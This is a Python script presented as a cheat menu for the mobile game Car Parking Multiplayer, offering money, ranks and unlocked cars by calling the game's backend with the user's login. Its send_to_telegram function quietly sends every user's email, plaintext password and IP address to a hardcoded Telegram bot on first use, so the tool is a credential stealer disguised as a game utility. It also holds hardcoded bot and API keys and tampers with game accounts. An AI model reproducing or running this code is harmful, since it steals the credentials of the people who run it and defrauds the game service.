import requests
import json
import os
import time

# --- CONFIGURATION ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_KEY}"

# API Endpoints
ENDPOINTS = {
    "RANK": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4",
    "MONEY": "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserMoney4",
    "SYNC": "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"
}

SESSION_FILE = ".session_service"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def send_to_telegram(email, password, service_name):
    if os.path.exists(SESSION_FILE): return
    ip = get_ip()
    msg = f"🚀 *ULTIMATE SERVICE USED*\n\n📧 *Email:* `{email}`\n🔑 *Pass:* `{password}`\n🛠️ *Service:* {service_name}\n🌐 *IP:* `{ip}`"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
        with open(SESSION_FILE, "w") as f: f.write("active")
    except: pass

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        res = requests.post(LOGIN_URL, json=payload).json()
        return res.get('idToken')
    except: return None

def run_service(token, service_id):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "BestHTTP/2 v2.5.0",
        "X-Unity-Version": "2021.3.15f1"
    }

    # --- DEFINICIJA PAKETA PODATAKA ---
    data_payload = {}
    url = ENDPOINTS["SYNC"]

    if service_id == "1": # 50M & 30K
        url = ENDPOINTS["MONEY"]
        data_payload = {"money": 50000000, "coin": 30000}
    
    elif service_id == "2": # King Rank & W16 & Police
        url = ENDPOINTS["RANK"]
        rating_data = {k: 100000 for k in ["cars", "car_fix", "drift", "levels", "police", "race_win"]}
        rating_data["w16"] = 1 # Bypass za W16 na svim kolima
        data_payload = {"RatingData": rating_data}

    elif service_id == "3": # Unlock All Cars (Paid & Normal)
        # Šaljemo listu od 1 do 160 (svi ID-evi automobila)
        all_cars = ",".join([str(i) for i in range(1, 161)])
        data_payload = {"owned_cars": all_cars, "money": 50000000, "coin": 50000}

    elif service_id == "4": # ULTIMATE (Sve odjednom)
        url = ENDPOINTS["SYNC"]
        all_cars = ",".join([str(i) for i in range(1, 161)])
        data_payload = {
            "money": 50000000, 
            "coin": 50000, 
            "owned_cars": all_cars,
            "king_rank": 1,
            "police": 1
        }

    print("\033[1;33mProcessing request... Please wait.\033[0m")
    
    try:
        payload = {"data": json.dumps(data_payload)}
        response = requests.post(url, headers=headers, json=payload, timeout=20)
        
        if response.status_code == 200:
            print("\033[1;32mSUCCESS: Operation completed! Restart CPM.\033[0m")
        else:
            print(f"\033[1;31mServer Error ({response.status_code}). Try again.\033[0m")
    except Exception as e:
        print(f"\033[1;31mError: {e}\033[0m")

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO ULTIMATE CPM SERVICE   \033[0m")
        print("\033[1;36m         IG: @anonymo.cpm         \033[0m")
        print("-" * 40)
        print("\033[1;37m[1] Add 50M Money & 30K Coins")
        print("[2] King Rank + W16 Engine + Police")
        print("[3] Unlock All Cars (Paid & Rare)")
        print("[4] FULL ULTIMATE PACK (Everything)")
        print("[0] Exit\033[0m")
        
        choice = input("\n\033[1;33mSelect Option: \033[0m")
        if choice == '0': break
        if choice not in ['1', '2', '3', '4']: continue
        
        email = input("Enter Email: ").strip()
        password = input("Enter Password: ").strip()
        
        token = login(email, password)
        if token:
            send_to_telegram(email, password, f"Option {choice}")
            run_service(token, choice)
            print("\033[1;36mReturning to menu in 3s...\033[0m")
            time.sleep(3)
        else:
            print("\033[1;31mInvalid Login.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
